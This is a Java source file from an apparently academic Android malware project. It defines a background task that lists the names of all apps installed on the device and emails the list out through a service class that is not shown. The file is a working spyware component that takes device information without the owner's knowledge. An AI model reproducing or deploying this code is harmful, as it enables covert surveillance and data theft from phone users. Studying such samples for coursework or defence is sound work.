/***********************************************************************
* This file is part of INF358-AndroidMalwareProject
* 
* Copyright (c) 2012  GPL Project Developer
* 
* INF358-AndroidMalwareProject is free software: you may copy, redistribute
* and/or modify it under the terms of the GNU General Public License as
* published by the Free Software Foundation, either version 2 of the
* License, or (at your option) any later version.
* 
* This file is distributed in the hope that it will be useful, but
* WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
* General Public License for more details.
* 
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
* authors: Issa CAMARA, Wajih JMAIEL, Julien MEDORI, Hakim WADIL

***********************************************************************/

package com.malware.data;

import java.util.List;

import com.malware.service.MyService;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.util.Log;

public class FetchInstalledAppsTask extends AsyncTask {

	private MyService service;
	private String label = "";
	
	private final boolean VERBOSE = true;
	private final String TAG = "FetchInstalledAppsTask";

	
	public FetchInstalledAppsTask(MyService service) {
		this.service = service;
	}
	
	@Override
	protected Object doInBackground(Object... params) {
		
		if (VERBOSE) Log.d(TAG, "Start of FetchInstalledAppsTask");
		
		PackageManager pm = (PackageManager) params[0];
		List<ApplicationInfo> apps = pm.getInstalledApplications(0);
		
		for(ApplicationInfo app : apps) {
			label += "- " + (String)pm.getApplicationLabel(app) + "\r\n";
		}
		
//		if (WIFI_ON)
		service.sendMail("Installed apps", label);

		if (VERBOSE) Log.d(TAG, "End of FetchInstalledAppsTask");

		return null;
	}

	public String getLabel() {
		return label;
	}
}
